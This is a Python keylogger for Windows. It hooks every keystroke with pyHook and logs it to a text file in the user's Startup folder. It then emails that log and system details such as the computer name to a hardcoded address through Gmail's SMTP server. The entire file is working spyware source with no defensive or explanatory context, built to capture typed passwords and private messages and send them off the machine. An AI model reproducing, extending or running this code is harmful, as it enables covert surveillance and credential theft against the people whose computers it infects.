import pyHook, pythoncom, sys, logging, os, platform, smtplib, datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


def archive():
    
    global computer, name, startup
    
    sender = 'email@email.com'
    receiver = 'email@email.com'
    pw = 'password'

    subject = name + dt
    
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = receiver
    msg['Subject'] = name

    body = str(computer)
    msg.attach(MIMEText(body, 'plain'))
    
    os.chdir(startup)
    for files in os.listdir(startup):
        if files.endswith(".txt"):
            filename = files
    attachment = open((filename), 'rb')
    
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= "+ filename)
    msg.attach(part)
    
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(sender, pw)

    server.sendmail(sender, receiver, text)
    server.quit()


def data_log():
    
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()


def OnKeyboardEvent(event):
    global log_file
    logging.basicConfig(filename = log_file, level = logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True


computer = platform.uname()
name = os.environ['COMPUTERNAME']
dt = datetime.datetime.today().strftime('%Y-%m-%d-%H-%M-%S')
startup = os.path.expandvars("%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
log_file = os.path.expandvars(startup + "\\" + name + ".txt")


os.chdir(startup)
for files in os.listdir(startup):
    if files.endswith(".txt"):
        archive()
        mode = "log"
        continue
    else:
        mode = "log"
        continue

while mode == "log":
    data_log()
